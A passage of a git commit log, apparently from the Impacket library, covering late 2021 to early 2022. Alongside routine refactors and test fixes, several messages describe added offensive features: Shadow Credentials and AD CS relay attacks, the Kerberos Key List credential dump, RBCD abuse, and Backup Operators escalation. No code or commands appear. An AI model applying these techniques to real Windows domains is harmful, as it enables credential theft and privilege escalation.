commit 2e9b8e3bd774da015a0ad7f951448cda5643d54e
Merge: 834557ac 805a0a99
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:37:02 2022 -0300

    Merge branch 'ccache-to-kirbi' into ccache-refactor

commit 834557ac540a10c41feb1ab1f49d24adadf6e241
Merge: 165361a8 ce1017a9
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:34:47 2022 -0300

    Merge branch 'master' into ccache-refactor

commit 165361a83aa8f6e8fbba0e7a8a8c2a035db5c875
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:34:10 2022 -0300

    Updated copyright year

commit 539361973a3faab1189ff1119b8ccc77b1632b28
Merge: 5f39724b 453cec8e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:28:06 2022 -0300

    Merge branch 'remove-duplicate-code' into ccache-refactor

commit 5f39724bb09fc265618c997be2e93f169cea6300
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:27:48 2022 -0300

    CCache: Minor changes
    - Added NotImplementedError for CCache v1 and v2
    - Added backward compatibility

commit e8440377e4730b98a2576280aa4eaadc1d7c8e44
Merge: 6042675a de0bfa43
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 10 11:23:36 2022 -0300

    Merge branch 'reznok/master' into ccache-refactor

commit 453cec8ed2a43700301c7f815c7872c40feaf9fe
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 21:13:03 2022 +0300

    add missing TGT value

commit ec8e97f781a0c68eaf8b294cd89db2da96b933b8
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 21:10:48 2022 +0300

    set the domain parameter as optional in the parseFile function, add the corresponding docstring

commit 382e7c09817de67695c5fd8229a702e86ac2b4a7
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 18:03:17 2022 +0300

    fix the error message in the loadFile function

commit 2cb6ec7618a3b4d2723c7ee6f721cb506beb294a
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Wed Mar 9 17:56:25 2022 +0300

    add the FileNotFoundError exception

commit 8c6e2e1bbff283cc58c2e7b4faca519d6c938a1e
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Tue Mar 8 18:02:00 2022 +0100

    Only dump ADCS once

commit 6d3c6b93909631e3303937ce62445e8aefd4a9c9
Merge: 275681da 6042675a
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Mar 4 07:54:32 2022 -0800

    Merge branch 'master' into warning-escape

commit 34e1673153c115e606bece143b0589f1657e020d
Merge: 32aea4c9 6042675a
Author: zblurx <68540460+zblurx@users.noreply.github.com>
Date:   Thu Mar 3 22:32:05 2022 +0100

    Merge branch 'SecureAuthCorp:master' into master

commit 673424731d3187a9237d056d1241ce9a97469429
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Feb 26 01:12:05 2022 +0300

    Update commentary

commit 96f5b7fa94b2cc1dfec4245774c16ec00d517895
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Feb 26 00:44:01 2022 +0300

    Add admin flag to smbpasswd.py

commit 805a0a9908062380a19caa0068c458a78aeb199e
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Sun Feb 20 13:44:34 2022 +0100

    Fixing Ccache to Kirbi conversion leaving service hostname out

commit 6042675a6c3632133ad4f932431aa96c5da5de5c
Merge: e84b4407 a699aaa7
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Feb 18 14:09:31 2022 -0300

    Merge pull request #1259 from dirkjanm/patch-1
    
    Remove debug line

commit a699aaa7651f4a99bdaccb836b2bd4a513413709
Author: Dirk-jan <dirkjan@outsidersecurity.nl>
Date:   Fri Feb 18 10:38:14 2022 +0100

    Remove debug line

commit e84b4407cff50802eb04e60106b1521bd9b931f5
Merge: 7d2991d7 9fee58da
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Feb 18 02:28:16 2022 -0300

    Merge pull request #1257 from ShutdownRepo/reg-save
    
    Adding save and backup options to reg.py

commit 7d2991d78836b376452ca58b3d14daa61b67cb40
Merge: 3f61baa3 572fbd4c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Feb 17 17:07:51 2022 -0300

    Merge pull request #1243 from Maltemo/master
    
    Changing corrupted source link

commit 3f61baa31ba02ec07df2f0bf9c5ff2bae30f0070
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Feb 17 09:25:24 2022 -0800

    Dropping Python 2.7 support and adjusting doc
    
    * Dropping Python 2.7 support. We're going to run it in GitHub Actions/Tox but only as experimental to have visibility.
    * Arranged README and updated installation steps.
    * Added latest ChangeLog entries.
    * Added tox-gh-actions to simplify workflow.

commit 9fee58daf083aba517e80de90a621aa90d44ebb4
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Thu Feb 17 01:49:48 2022 +0100

    Added a `backup` method saving SAM SYSTEM and SECURITY "at once"
    Co-authored-by: scopedsecurity <zachhanley@gmail.com>

commit ae1903d38be788f50849b98107d633b145bfe731
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Thu Feb 17 01:09:11 2022 +0100

    Fixed access denied on `SECURITY` hive
    Co-authored-by: scopedsecurity <zachhanley@gmail.com>

commit cfed931afeb16a44e8e45f00809c32eb88ff531c
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Feb 16 15:18:46 2022 +0100

    Adding save function for Backup Operators to Domain Admin exploitation

commit 275681da6b8ec3d5b1109fb657ebb8d09072f28b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Feb 9 11:58:17 2022 -0800

    Fixed some escape warnings due to regex strings

commit 1c9624c0ff435410af17d1b24a60a05f3010be9c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Feb 9 11:10:30 2022 -0800

    CCache: Added some unit tests
    
    - Parsing v3 and v4 ccache files to check #1106 (and not support for v1 and v2)
    - Parsing creds from kirbi to check #1254
    - Checking #1166 parseFile function

commit f73c313a56678da2d47fff906036cb3fcc0952a7
Merge: b28496a2 435fba1a
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Wed Feb 9 15:31:22 2022 +0100

    Merge pull request #4 from nodauf/shadowcredentials
    
    Use a temporary variable

commit b28496a21c95f2dd282bb91ea27a48acfcf07588
Merge: c95f23b0 769c3196
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Wed Feb 9 15:30:41 2022 +0100

    Merge branch 'SecureAuthCorp:master' into shadowcredentials

commit ce1017a91c38e1d5557111069bc36ce8a1769b19
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Feb 8 22:41:52 2022 -0300

    CCache: Modified fromKRBCRED function used to load a Kirbi file
    - Added authtime field
    - Changed keyvalue type
    - It should fix #1056

commit 769c3196124af64d7bc08d51ae4b651e61a87037
Merge: 09163293 d595d33c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 8 12:24:05 2022 -0300

    Merge pull request #1188 from SAERXCIT/default-template
    
    Default ADCS template to "Machine" or "User" whether relayed account name ends with "$"

commit 09163293a954a431febab911eefc64efce5209d4
Merge: ed7082cd 569281ae
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 8 12:22:39 2022 -0300

    Merge pull request #1214 from SAERXCIT/ldaprelay-getadcsenrollmentsvc
    
    LDAP attack: dump ADCS enrollment services and certificate templates info

commit 435fba1a73bdd32c6ba1ed34b4aee5e0368f1959
Author: Nodauf <nodauf@krutt.org>
Date:   Sun Feb 6 10:15:28 2022 +0400

    Fix issue when two differents users tried to do the attacks without the target being specified

commit c95f23b08b59215ab6190036967de5dea65474bb
Merge: fe744026 ed7082cd
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Sat Feb 5 12:56:08 2022 +0100

    Merge branch 'SecureAuthCorp:master' into shadowcredentials

commit ed7082cd0bc0d951f6eefb0a98c4c1360fe1a8a2
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 3 15:58:19 2022 -0300

    Updated changelog and some script headers.

commit 2abda3c8b3906b882f02816d05a900a435fd4fe9
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 3 15:57:57 2022 -0300

    Tests: Added new test cases in MS-PAR and MS-RPRN.

commit a67fa605077d351ee93b52a1514b7dc1671fbb16
Merge: d8679837 71a475c3
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Feb 3 15:14:10 2022 -0300

    Merge pull request #1193 from raithedavion/master
    
    Added "GetDriverDirectory" functions to MS-PAR and MS-RPRN.

commit 71a475c33ab2f6f397f40d502b1f773279869cfc
Author: raithedavion <raithedavion@gmail.com>
Date:   Thu Feb 3 10:54:05 2022 -0700

    Update par.py
    
    Removed ('pcbNeeded', DWORD) from RpcAsyncGetPrinterDriverDirectory definition, and renamed comment on line 403 per the request of 0xdeaddood.

commit 47737303dc3167f55df16d3b26e2c69f5f292c05
Author: raithedavion <raithedavion@gmail.com>
Date:   Thu Feb 3 10:52:26 2022 -0700

    Update rprn.py
    
    Removed ('pcbNeeded', DWORD) in RpcGetPrinterDriverDirectory as requested by 0xdeaddood.

commit d8679837a66b24df9bee0899b2dafb131c39496b
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Feb 1 19:16:45 2022 -0300

    Updated changelog and some script headers

commit 99f1b207af71420fcc52b67befde2b9488239c9f
Merge: a7095c75 981eb5bc
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 1 18:51:30 2022 -0300

    Merge pull request #1209 from simondotsh/ms-dssp
    
    Implementation of MS-DSSP with a short example.

commit a7095c75ccbbd4c1bc5e53607699a7ae19a8647e
Merge: badf09d5 93fb6ec9
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Feb 1 18:49:32 2022 -0300

    Merge pull request #1190 from CCob/master
    
    Initial support for raw NTLM relay server

commit fe744026ec2069f169d4aab9d05b32c4743cb962
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Tue Feb 1 16:38:16 2022 +0100

    Adding Shadow Credentials attack to ntlmrelayx
    Co-authored-by: Tw1sm <mcreel31@gmail.com>
    Co-authored-by: nodauf <nodauf@users.noreply.github.com>

commit badf09d5c5733d9bda03eef4978ce4f3238e21d3
Merge: df5a4538 7aabdb16
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jan 31 20:04:24 2022 -0300

    Merge pull request #1200 from rmaksimov/fix-indent
    
    fix indent in addcomputer.py

commit df5a4538220b703321782f296128470d2444230d
Merge: e007046d ecc3008d
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jan 31 13:24:44 2022 -0300

    Merge pull request #1247 from SecureAuthCorp/test-refactor
    
    Refactor of testing infrastructure

commit ecc3008d3bad6e53204d38e93f3bda1d99b0000c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jan 28 17:17:59 2022 -0300

    Tests: some fixes to NRPC tests
    - Updated the Netlogon Authenticator computation.
    - Modified the authenticate function. Now, the user's machine connects to the server.
    - Marked some tests as Xfail due to the Zerologon patch.

commit e007046def3d7e2afa27dd83cb9e53f452099175
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jan 28 17:02:56 2022 -0300

    Removed non-ASCII char that's failing (#1239)
    
    This is failing in Python 2.7 and throwing errors on other version, but wasn't catched but in the new test refactor.

commit 0361250ea4a531bb9262dad0b8703c392d155cd4
Merge: 84d254d9 7454cb38
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jan 28 16:40:17 2022 -0300

    Merge branch 'master_Impacket' into test-refactor

commit 7454cb38bdf29a71de3f89686ca5f31cb02e5383
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jan 28 16:10:28 2022 -0300

    NRPC: Added a function to compute the Netlogon Authenticator at client-side

commit 572fbd4c2d6e76ab9e5c05d23dc6761cbbca4aa3
Author: Maltemo <maltemo@protonmail.com>
Date:   Mon Jan 24 17:59:33 2022 +0100

    Changing corrupted source link

commit 32aea4c96e59896d718e34ce925164f6ed13e68a
Author: zblurx <seigneuret.thomas@pm.me>
Date:   Fri Jan 21 15:41:44 2022 +0100

    disable-multi smb added

commit f139e11255dedfc0f5836c9b3c0bb93c40307d8c
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Thu Jan 20 18:04:59 2022 +0100

    ntlmrelayx can have multiple http listeners at the same time

commit 84d254d935bb1707ed8de8f9d04da71d272ffbff
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 14:47:52 2022 -0300

    Tests: Make SCMR tests more idempotent (#1238)
    
    - If a previous test run broke, the services was left on the target and thus create calls will fail. Implemented an open or create helper function to solve that.

commit 12de27dcc9b88361dee74f4ed1c397e383c9964a
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 10:19:25 2022 -0300

    NRPC: Fixed NetrLogonControl2(Ex)Response structures (#1235)
    
    - Structures for the `NetrLogonControl2` and `NetrLogonControl2Ex` call responses were using `NETLOGON_CONTROL_DATA_INFORMATION` instead of `NETLOGON_CONTROL_QUERY_INFORMATION`.
    
    Reference: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/df7e5dd1-ebcc-4754-9da0-2e0bded82d29

commit 6a05157e67b40295226603bbfec69ea4eb39be74
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 10:18:48 2022 -0300

    DHCPM: added more error codes and fixed Client Info array structure (#1234)
    
    - Added error codes and messages from the specs.
    - Fixed `DHCP_CLIENT_INFO_ARRAY_V5` which was using `LPDHCP_CLIENT_INFO_V4_ARRAY` instead of `LPDHCP_CLIENT_INFO_V5_ARRAY` member.

commit 1ef157f8b7f0484c6bf0b6e6c786978631a3f61e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 19 10:17:38 2022 -0300

    ATSVC: Fixed NetrJobEnum struct (#1233)
    
    - `NetrJobEnum` incorrectly defined `pResumeHandle` as `DWORD` instead of `LPDWORD`.

commit 35700a999af1e4411e58f9462adc2098884c24f1
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jan 18 18:29:25 2022 -0300

    Tests: Added some basic test cases for [MS-PAR] (#1237)
    
    - Testing `RpcAsyncEnumPrinters` and `RpcAsyncEnumPrinterDrivers` calls

commit 4c7a68f500a1fba739519b573b22a6063ec87177
Merge: a8b863a5 7722d094
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jan 18 15:40:03 2022 -0300

    Merge pull request #1236 from SecureAuthCorp/test-refactor-passrate
    
    Tests: improving refactor passrate

commit 7722d094a329494d581a70a41eb0e03d5d0c0807
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jan 18 05:00:27 2022 -0800

    Tests: arranging DHCPM test cases

commit 3b2c07b16237c4cb7f4310519bdb68ae38c0b16c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jan 17 13:21:22 2022 -0800

    Tests: Fixed broken SRVS test case
    
    Using a more generic exception catch for when we're closing ourselvex

commit e6b2f207fc7a76d461d53fec5fd3f407db751755
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jan 17 12:38:27 2022 -0800

    Tests: some fixes to NRPC tests to get back to previous pass rate

commit 10e53952e64e290712d49e263420b70b681bbc73
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jan 5 15:13:06 2022 -0300

    Removed unnecessary PY3 import

commit 2ab3136c0f187d6489f3c79b8e3917c04ca8102c
Author: hugo-syn <hugo.vincent@synacktiv.com>
Date:   Wed Jan 5 10:12:43 2022 +0100

    fix log

commit 981923da0a480327b385a5c5b096a6a5122cef04
Author: hugo-syn <hugo.vincent@synacktiv.com>
Date:   Wed Jan 5 09:58:56 2022 +0100

    ADCS ESC1 and ESC6 support

commit 14506dd6bcf7e8045dca08175023f1c592d19ecc
Author: Lukas Kuzmiak <lukash@backstep.net>
Date:   Sat Dec 18 22:34:58 2021 -0800

    Fix for "TypeError: sequence item 0: expected str instance, bytes found"

commit e155103ea2637c3998af2680ee3a3efdb9b94072
Author: capnkrunchy <gkempf@issgs.net>
Date:   Fri Dec 10 18:37:36 2021 -0600

    Add rename_computer and modify add_computer in ldap interactive shell

commit a8b863a50ddbc5f73226d24df3a57b31fcf81b42
Merge: 91694559 728d7a2e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 20:26:05 2021 -0300

    Merge pull request #1220 from SecureAuthCorp/test-refactor-py310
    
    Tests: Enable Python 3.10 as experimental

commit 728d7a2e2e9e275bbb2503b518774c793f56077e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 15:19:59 2021 -0800

    Tests: Fixed Python 3.10 version for GH Actions

commit 79193f50ec95789ae61cbb5cf1e8d03b33ab5ebf
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 06:37:24 2021 -0800

    Moved Python 2.7 as experimental

commit c048db37cb64efa1ec29c80f1b012c65fbee410a
Merge: 83fcc47e 91694559
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 06:21:48 2021 -0800

    Merge branch 'test-refactor' into test-refactor-py310

commit 91694559e9624b100d3976fe92d432e819d5992c
Merge: 1893ce7f ee3d988b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 11:20:22 2021 -0300

    Merge pull request #1219 from SecureAuthCorp/test-refactor-catchup
    
    Test refactor catchup

commit ee3d988b06f6c5bb7f1b0c03a29a31959f9d2b43
Merge: 1893ce7f 1dad8f7f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Dec 3 06:05:46 2021 -0800

    Merge branch 'master' into test-refactor-catchup

commit 569281ae5b4224db314ea79678b3b83e72a0024e
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Sun Nov 21 13:01:03 2021 +0100

    Fix typo

commit d7c434dd5389f22ac0fefeacc52488935703720d
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Sun Nov 21 12:30:07 2021 +0100

    Output principals who can enroll on each enrollment service and template

commit d2e981f7f60873d0fdff44cb20f905c7501982e9
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Fri Nov 19 16:05:52 2021 +0100

    Add LDAP Relay to dump ADCS enrollment services info

commit 1b0b3383c486dec6851dcea6e3517e8814f00d7f
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Nov 15 18:06:11 2021 -0300

    Added paramater validation

commit 91f7bb3a527ef1bdcb418e3efd6890faeb4df9d4
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Nov 11 00:17:00 2021 -0300

    The Kerberos Key List Attack
    Implementation of a new credential dumping method. This PR includes:
    - examples/keylistattack.py: A new example with the implementation of the attack.
    - examples/secretsdump.py: A new option (use-keylist) to dump credentials with the new attack instead of default the DRSUAPI method.
    - impacket/examples/secretsdump.py: Modifications to the library to support the new attack.

commit 981eb5bc4ab6d0ef73d1bf64e4b3f040796a752c
Author: simondotsh <simon747sh@gmail.com>
Date:   Tue Nov 9 17:54:21 2021 -0500

    Added missing socket close

commit 85eed9d4dcfc109f7790098cbc7745196a9481b7
Author: simondotsh <simon747sh@gmail.com>
Date:   Sun Nov 7 16:20:08 2021 -0500

    Added missing new line at the end of files

commit c94ccfa908ec359f171f7a71d6e0b0ffde04263b
Author: simondotsh <simon747sh@gmail.com>
Date:   Sun Nov 7 16:12:52 2021 -0500

    Implementation of MS-DSSP with a short example

commit 4039f5c4e1a7dcf3804d0d8e352c3c7bd799b5d4
Author: Jonathan <w0rmh013@users.noreply.github.com>
Date:   Mon Nov 1 23:26:15 2021 +0200

    Fixed entropy parameter handling in dpapi.py/unprotect

commit 7aabdb16895cc2af5808e395766c10f008a89a7f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sat Oct 30 23:41:19 2021 +0300

    fix indent in addcomputer.py

commit 921cc05342d833c116b0afbdd6799a105be6a680
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sat Oct 30 22:25:45 2021 +0300

    remove duplicate code in rbcd.py

commit d61c9ef738101ecb86b190ac6fad4a9eca41a842
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Fri Oct 22 02:00:19 2021 +0300

    remove incompatible changes with python2

commit 435dadfe61c980f561ae70967783fbac6ee82ea0
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Sep 6 11:40:41 2021 +0300

    clean up the code

commit 1409b455c842a78fab375d9f72675f1c762d319e
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Sep 6 11:35:46 2021 +0300

    add the parseFile class method and remove all the duplicate code

commit 1dad8f7f9fee82d63c876e781f2d2bab3975f2bb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 12:32:55 2021 -0300

    And going back to dev version

commit 265ce178fc1afcf942e2e1fabd7c8fab64e94893
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 12:27:35 2021 -0300

    Revert "And going back to dev version"
    
    This reverts commit ef65bdc3479dea0c7f6aea14ba2f96b3b9396892.

commit ef65bdc3479dea0c7f6aea14ba2f96b3b9396892
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 12:19:24 2021 -0300

    And going back to dev version

commit 0d848d7ea52e59a49ad300866b8996ce401c2c29
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Oct 27 11:55:46 2021 -0300

    About to tag a release

commit ea023b2813ba512cbd556e59415fd020b9fbc423
Merge: 4229481c 62b8769c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Oct 26 12:28:19 2021 -0300

    Merge pull request #1197 from ShutdownRepo/rbcd
    
    Dup fix and file mode changed to 775

commit 62b8769c3b1c7fe675bdc72e7aa64e1a72fb584e
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Mon Oct 25 17:47:21 2021 +0200

    Dup fix and file mode changed to 775

commit 4229481c26c2021651d2dad446401621cf5d6fa7
Merge: b66cd365 b5599da0
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 22 18:28:43 2021 -0300

    Merge pull request #1183 from ShutdownRepo/getST-for-kcd-kerberos-only
    
    Added support for a custom additional ticket for S4U2Proxy

commit b5599da0224491e4c31c1f1314c4ed9f716d057c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 22 18:10:44 2021 -0300

    Fixed typos

commit b66cd365ff935e3541686dafae2b72f955b297d0
Merge: 20ccf828 4080879f
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 22 17:14:07 2021 -0300

    Merge pull request #1108 from ShutdownRepo/rbcd
    
    Added rbcd attack script

commit 4080879f63085e83a8d14507f624390c39501f94
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Fri Oct 22 22:00:28 2021 +0200

    Update examples/rbcd.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 20ccf8281a6c21b4e64b11fb391158da5dbf1242
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Oct 21 17:37:06 2021 -0300

    Removed unnecessary anonymous login handling.

commit 1b74b06fa19e82c743b443698b1ffe0ec2571c7a
Merge: c0ec6102 1c3fdaee
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 21 17:11:20 2021 -0300

    Merge pull request #1179 from ly4k/master
    
    Disable anonymous logon in ntlmrelayx

commit d595d33c2b08f238cbc204448930b09aabfd391d
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Thu Oct 21 10:18:48 2021 +0200

    Don't override template for whole attack, just for current relay

commit 115518771263a2f0d97e29201773136f14e8be7d
Author: raithedavion <raithedavion@gmail.com>
Date:   Tue Oct 19 16:14:13 2021 -0600

    Update requirements.txt
    
    Removed temporary cryptography requirement.

commit 5d87198c01ced2cb65b610d0ec97853c1f9ecc09
Author: raithedavion <raithedavion@gmail.com>
Date:   Tue Oct 19 14:34:44 2021 -0600

    MS-PAR and MS-RPRN modifications.
    
    Added MS-PAR RpcAsyncGetDriverDirectory and MS-RPRN RpcGetDriverDirectory to par.py and rprn.py respectively

commit 93fb6ec903854b4512bb8ff56eb5022c47b178d9
Author: CCob <CCob@users.noreply.github.com>
Date:   Sun Oct 17 21:22:43 2021 +0100

    Initial support for raw NTLM relay server for lsarelayx (and other third party relay tools)

commit c0ec61022de20ea06724ec04d7c925c4c56b1c9c
Merge: d5839302 139e4505
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Oct 15 12:51:34 2021 -0300

    Merge pull request #1174 from p0dalirius/master
    
    Added parsing of LSA's Security Questions Security Answers structure version 1.0

commit 4edbf1453fc4295011c0bc28adc99a64e235abe7
Author: SAERXCIT <78735647+SAERXCIT@users.noreply.github.com>
Date:   Fri Oct 15 12:33:29 2021 +0200

    Default ADCS template to "Machine" or "User" whether relayed account name ends with "$"

commit 50d1ec9e809b6c79a7f75c46599e432f21a83c9f
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Fri Oct 15 12:02:37 2021 +0200

    Co-authored-by: GeisericII <g.giacobbe1@outlook.it>

commit 139e4505bae534590aa4d62f1a809717116ccb18
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri Oct 15 08:48:51 2021 +0200

    Update secretsdump.py

commit d5839302a46e279902c87b3adb434c571c5040ad
Merge: 3ff7e6f2 d4d60954
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 16:18:57 2021 -0300

    Merge pull request #1175 from p0dalirius/fixing_psexec_encodings
    
    Fixes #1079 psexec.py decoding problems on multi bytes characters

commit 3ff7e6f229627f10b738796156bd44f342874836
Merge: ff813e45 3fe2d73a
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 15:36:33 2021 -0300

    Merge pull request #1101 from ExAndroidDev/ntlmrelayx-adcs-attack
    
    Implementation of AD CS attack in ntlmrelayx.py

commit ff813e457b4c3415d89b21fa1c203074b401c935
Merge: cf03f344 f40f86e8
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 15:07:38 2021 -0300

    Merge pull request #1160 from Gifts/master
    
    Implementing reg.py ADD/DELETE functionality

commit cf03f34440941259db435e77020bb4f70ae1bc63
Merge: bbdabd81 679d90cf
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu Oct 14 11:54:42 2021 -0300

    Merge pull request #899 from Rcarnus/ldapAttack
    
    ldapattack: fix error when trying to escalate with machine account

commit bbdabd81753e1066db47146f9f53b89c435f66e2
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Oct 14 11:44:12 2021 -0300

    Added anonymous session handling in httprelayserver.py
    It should fix #1132

commit f40f86e846b718162c27f8b2c1d4332e4b32ac06
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Thu Oct 14 15:39:13 2021 +0300

    Fix argument help to include HKCR (HKEY_CLASSES_ROOT)
    Added relevant example to update empty value of Key.

commit 8c5eb3f53f9251400409cb59d6e3669ed084f032
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Wed Oct 13 19:22:35 2021 +0300

    Refactoring duplicate code to __strip_root_key function

commit 3fe2d73ae855d81bca73de75b5bda520c5b3feb1
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Wed Oct 13 15:22:15 2021 +0200

    Refactored httpattack.py, implemented AD CS attack as a submodule

commit 76f39926559b8e1af81aafaab2fac5dee97f8bf3
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Sun Oct 10 18:47:38 2021 +0200

    Added -additional-ticket feature for S4U2Proxy for KCD Kerberos only abuse

commit d4d60954aea3ddb0fc1e3cbfd1fdff6b81f02e68
Author: p0dalirius <podalirius@protonmail.com>
Date:   Fri Oct 8 12:18:08 2021 +0200

    Updated prompt regex
    Removed debug comments

commit 1c3fdaeed7d7b907b0f44d6b88dea8c24364f382
Author: ollypwn <53348818+ollypwn@users.noreply.github.com>
Date:   Wed Oct 6 20:58:45 2021 +0200

    Disable anonymous logon in ntlmrelayx
    
    By default, SMBSERVER allows anonymous logon. For ntlmrelayx, this
    is not desired since we're not interested in relaying an anonymous
    session, and ntlmrelayx even skips anonymous logons. After the patch for
    the PetitPotam exploit, the service now tries to logon with an anonymous
    session, but if we're returning STATUS_ACCESS_DENIED, the service will
    continue to NTLM authentication. This patch will create a new option for SMBSERVER
    that can disable anonymous logon via config_parser/serverConfig.
    Anonymous logon sessions will now return STATUS_ACCESS_DENIED.

commit e0751ae142713439ae46d1fa935d14403d48b3f6
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Oct 3 14:02:18 2021 +0200

    Fixes #1079 psexec.py decoding problems on multi bytes characters, with py2 support

commit f0a3917d589c43166b1516141732577241bc56de
Author: p0dalirius <podalirius@protonmail.com>
Date:   Sun Oct 3 13:26:36 2021 +0200

    Fixes #1079 psexec.py decoding problems on multi bytes characters

commit 25c74b237baa88289c5b9064fc2d1d983f908a39
